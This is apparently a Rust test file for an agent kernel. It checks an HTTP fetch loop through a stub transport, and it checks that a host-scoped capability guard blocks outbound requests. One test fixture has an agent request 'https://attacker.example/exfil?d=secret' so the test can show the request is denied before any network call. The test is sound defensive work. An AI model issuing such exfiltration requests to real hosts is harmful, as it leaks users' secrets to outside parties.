//! End-to-end: an agent RUNS a real fetch loop through the [`HttpExecutor`].
//!
//! A reducer emits an `Http` effect (target = URL); the kernel authorizes it against a SEC-F1 `HostIn`
//! capability (the SSRF/exfil guard), durably dispatches it, the `HttpExecutor` performs the request
//! (here a STUB transport, so the loop is hermetically gateable), and the response body folds back and
//! drives the agent's next step. The REAL client drops into the same wiring behind `live-net`.

use cdz_agent_host::{HttpExecutor, HttpMethod, HttpResponse, HttpTransport};
use cdz_kernel::authz::Authorizer;
use cdz_kernel::effect::{
    effect_ct, Capability, EffectKind, EffectRequest, Payload, ResourcePredicate, Timeliness,
};
use cdz_kernel::event::{ContentType, EffectOutcome, Event, EventBody};
use cdz_kernel::event_ast::{decode_http_response, encode_http_request};
use cdz_kernel::executor::CompositeExecutor;
use cdz_kernel::hash::Hash;
use cdz_kernel::kernel::Session;
use cdz_kernel::kv::Kv;
use cdz_kernel::reducer::{FoldOutput, Reducer};

/// A stub HTTP transport: returns a canned 200 response (status + a header + body) so the fetch loop is
/// hermetic. The real client implements this same trait behind `live-net`. Asserts the caller-specified GET.
struct StubHttp;
#[async_trait::async_trait(?Send)]
impl HttpTransport for StubHttp {
    async fn request(
        &self,
        method: HttpMethod,
        url: &str,
        _headers: &[(String, String)],
        _body: Option<&[u8]>,
        _key: Hash,
    ) -> Result<HttpResponse, String> {
        assert_eq!(method, HttpMethod::Get, "the reducer emitted a GET");
        Ok(HttpResponse {
            status: 200,
            headers: vec![("content-type".to_string(), "text/plain".to_string())],
            body: format!("fetched {url}").into_bytes().into(),
        })
    }
}

/// A minimal agent that fetches a URL: on "go" it emits an `Http` effect; when the response comes back it
/// decodes the http-response, stashes the status + body, and marks itself `fetched`. The loop closes
/// through a real executor + proves the reducer can read the status, not just the body.
struct FetchAgent;
#[async_trait::async_trait(?Send)]
impl Reducer for FetchAgent {
    async fn fold(&self, event: &Event, kv: &mut Kv) -> FoldOutput {
        match &event.body {
            EventBody::Inbound { .. } => {
                kv.put(b"phase".to_vec(), b"fetching".to_vec());
                FoldOutput::with(vec![EffectRequest::new_with_family(
                    effect_ct::HTTP,
                    "https://ok.host/data",
                    // Explicit method in the http-request payload — a GET with no body.
                    Some(Payload::Inline(encode_http_request("get", None).into())),
                    Timeliness::Interactive,
                )])
            }
            EventBody::EffectResult {
                result: EffectOutcome::Ok(Some(Payload::Inline(payload))),
                ..
            } => {
                // The result is an (http-response …) — decode it to read status + body.
                let (status, _headers, body) =
                    decode_http_response(payload).expect("result is a valid http-response");
                kv.put(b"status".to_vec(), status.to_string().into_bytes());
                kv.put(b"body".to_vec(), body);
                kv.put(b"phase".to_vec(), b"fetched".to_vec());
                FoldOutput::none()
            }
            _ => FoldOutput::none(),
        }
    }
}

fn inbound_go() -> EventBody {
    EventBody::Inbound {
        content_type: ContentType {
            family: "message".into(),
            version: 1,
        },
        payload: Payload::Inline(b"go".to_vec().into()),
    }
}

/// Grant `Http` scoped to the one host (SEC-F1 SSRF/exfil guard — deny everything else).
fn host_cap() -> Authorizer {
    Authorizer::new(vec![Capability {
        kind: EffectKind::Http,
        predicate: ResourcePredicate::HostIn(vec!["ok.host".into()]),
    }])
}

#[tokio::test]
async fn agent_loop_runs_end_to_end_through_the_http_executor() {
    let reducer = FetchAgent;
    let mut exec = CompositeExecutor::new()
        .with_effect(effect_ct::HTTP, Box::new(HttpExecutor::new(StubHttp)));
    let mut session = Session::genesis(
        Hash::of(b"fetch-agent-v1"),
        Hash::of(b"fetch-agent-v1-nonce"),
    );

    session
        .deliver(inbound_go(), None, &FetchAgent, &host_cap(), &mut exec)
        .await
        .unwrap();

    // The loop closed: the agent fetched, the executor performed the request, and the response body
    // folded back and advanced the agent to `fetched`.
    assert_eq!(session.kv().get(b"phase"), Some(&b"fetched"[..]));
    assert_eq!(
        String::from_utf8_lossy(session.kv().get(b"body").expect("body recorded")),
        "fetched https://ok.host/data"
    );
    assert_eq!(session.open_effects(), 0);

    // Replay-equivalence: the response is recorded, so replay reconstructs the identical KV without
    // re-fetching.
    let replayed = Session::replay(session.log().to_vec(), &reducer)
        .await
        .unwrap();
    assert_eq!(replayed.snapshot().kv_root, session.snapshot().kv_root);
}

#[tokio::test]
async fn a_fetch_to_an_unpermitted_host_is_denied_before_the_client() {
    // Deny-by-default / SEC-F1: the grant is for `ok.host`; an agent fetching a DIFFERENT host (an
    // exfil/SSRF attempt) is denied at the gate — the client (a real network call) is never reached. A
    // transport that panics if called proves the executor was never consulted.
    struct MustNotCall;
    #[async_trait::async_trait(?Send)]
    impl HttpTransport for MustNotCall {
        async fn request(
            &self,
            _m: HttpMethod,
            _u: &str,
            _h: &[(String, String)],
            _b: Option<&[u8]>,
            _k: Hash,
        ) -> Result<HttpResponse, String> {
            panic!("a denied Http effect must never reach the client");
        }
    }
    struct ExfilAgent;
    #[async_trait::async_trait(?Send)]
    impl Reducer for ExfilAgent {
        async fn fold(&self, event: &Event, _kv: &mut Kv) -> FoldOutput {
            if matches!(event.body, EventBody::Inbound { .. }) {
                FoldOutput::with(vec![EffectRequest::new_with_family(
                    effect_ct::HTTP,
                    "https://attacker.example/exfil?d=secret",
                    None,
                    Timeliness::Interactive,
                )])
            } else {
                FoldOutput::none()
            }
        }
    }
    let mut exec = CompositeExecutor::new()
        .with_effect(effect_ct::HTTP, Box::new(HttpExecutor::new(MustNotCall)));
    let mut session = Session::genesis(
        Hash::of(b"exfil-agent-v1"),
        Hash::of(b"exfil-agent-v1-nonce"),
    );
    session
        .deliver(inbound_go(), None, &ExfilAgent, &host_cap(), &mut exec)
        .await
        .unwrap();

    // Denied at the gate → a denial is on the log and nothing left open.
    assert!(session
        .log()
        .iter()
        .any(|e| matches!(e.body, EventBody::AuthzDenied { .. })));
    assert_eq!(session.open_effects(), 0);
}
